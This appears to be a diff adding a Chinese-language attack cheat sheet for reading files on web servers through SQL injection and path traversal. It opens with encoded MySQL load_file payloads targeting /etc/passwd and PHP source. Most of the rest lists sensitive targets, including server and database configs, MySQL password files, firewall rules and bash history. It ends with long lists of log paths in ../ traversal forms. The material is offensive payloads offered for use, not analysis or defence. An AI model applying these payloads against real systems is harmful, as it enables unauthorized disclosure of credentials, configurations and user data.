@@ -1,0 +1,142 @@
+1、 replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
+
+2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
+
+3、 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
+
+4、/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+
+5、c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf  查看WINDOWS系统apache文件
+
+6、c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.
+
+7、c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+
+8、d:\APACHE\Apache2\conf\httpd.conf
+
+9、C:\Program Files\mysql\my.ini
+
+10、../themes/darkblue_orange/layout.inc.php  phpmyadmin 爆路径
+
+11、 c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件
+
+12、 /usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看
+
+13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+
+14 、/usr/local/app/apache2/conf/extratpd-vhosts.conf APASHE虚拟主机查看
+
+15、 /etc/sysconfig/iptables 本看防火墙策略
+
+16 、 /usr/local/app/php5 b/php.ini  PHP 的相当设置
+
+17 、/etc/my.cnf  MYSQL的配置文件
+
+18、 /etc/redhat-release   红帽子的系统版本
+
+19 、C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+
+20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.
+
+21、/usr/local/app/php5 b/php.ini //PHP相关设置
+
+22、/usr/local/app/apache2/conf/extratpd-vhosts.conf //虚拟网站设置
+
+23、c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+
+24、c:\windows\my.ini
+
+25、/etc/issue 显示Linux核心的发行版本信息
+
+26、/etc/ftpuser
+
+27、查看LINUX用户下的操作记录文件.bash_history 或 .bash_profile
+
+28、/etc/ssh/ssh_config
+
+
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log 
+/etc/httpd/logs/access_log 
+/etc/httpd/logs/access.log 
+/var/log/apache/error_log 
+/var/log/apache/error.log 
+/var/log/apache/access_log 
+/var/log/apache/access.log 
+/var/log/apache2/error_log 
+/var/log/apache2/error.log 
+/var/log/apache2/access_log 
+/var/log/apache2/access.log 
+/var/www/logs/error_log 
+/var/www/logs/error.log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/error_log 
+/usr/local/apache/logs/error.log 
+/usr/local/apache/logs/access_log 
+/usr/local/apache/logs/access.log 
+/var/log/error_log 
+/var/log/error.log 
+/var/log/access_log 
+/var/log/access.log
+/etc/mail/access
+/etc/my.cnf
+/var/run/utmp
+/var/log/wtmp
+
+
+../../../../../../../../../../var/log/httpd/access_log 
+../../../../../../../../../../var/log/httpd/error_log 
+../apache/logs/error.log 
+../apache/logs/access.log 
+../../apache/logs/error.log 
+../../apache/logs/access.log 
+../../../apache/logs/error.log 
+../../../apache/logs/access.log 
+../../../../../../../../../../etc/httpd/logs/acces_log 
+../../../../../../../../../../etc/httpd/logs/acces.log 
+../../../../../../../../../../etc/httpd/logs/error_log 
+../../../../../../../../../../etc/httpd/logs/error.log 
+../../../../../../../../../../var/www/logs/access_log 
+../../../../../../../../../../var/www/logs/access.log 
+../../../../../../../../../../usr/local/apache/logs/access_log 
+../../../../../../../../../../usr/local/apache/logs/access.log 
+../../../../../../../../../../var/log/apache/access_log 
+../../../../../../../../../../var/log/apache/access.log 
+../../../../../../../../../../var/log/access_log 
+../../../../../../../../../../var/www/logs/error_log 
+../../../../../../../../../../var/www/logs/error.log 
+../../../../../../../../../../usr/local/apache/logs/error_log 
+../../../../../../../../../../usr/local/apache/logs/error.log 
+../../../../../../../../../../var/log/apache/error_log 
+../../../../../../../../../../var/log/apache/error.log 
+../../../../../../../../../../var/log/access_log 
+../../../../../../../../../../var/log/error_log 
+/var/log/httpd/access_log       
+/var/log/httpd/error_log     
+../apache/logs/error.log     
+../apache/logs/access.log 
+../../apache/logs/error.log 
+../../apache/logs/access.log 
+../../../apache/logs/error.log 
+../../../apache/logs/access.log 
+/etc/httpd/logs/acces_log 
+/etc/httpd/logs/acces.log 
+/etc/httpd/logs/error_log 
+/etc/httpd/logs/error.log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/access_log 
+/usr/local/apache/logs/access.log 
+/var/log/apache/access_log 
+/var/log/apache/access.log 
+/var/log/access_log 
+/var/www/logs/error_log 
+/var/www/logs/error.log 
+/usr/local/apache/logs/error_log 
+/usr/local/apache/logs/error.log 
+/var/log/apache/error_log 
+/var/log/apache/error.log 
+/var/log/access_log 
+/var/log/error_log
